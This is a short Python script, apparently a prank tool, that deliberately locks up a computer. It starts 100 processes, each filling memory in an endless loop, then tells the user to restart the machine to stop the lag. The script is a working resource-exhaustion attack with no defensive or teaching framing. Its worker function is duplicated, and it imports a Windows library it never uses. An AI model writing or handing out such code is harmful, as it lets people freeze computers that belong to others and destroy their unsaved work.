from multiprocessing import Pool
import win32api


def f(x):
    t = []
    while True:
        t.append(x * x)

threads = 100 #Change to set processor thread usage#

if __name__ == '__main__':
    p = Pool(threads)
    p.map(f, range(threads))

def f(x):
    t = []
    while True:
        t.append(x * x)


i = ("The computer is lagging to disable it restart the computer")
while i * 10:
    print(i)













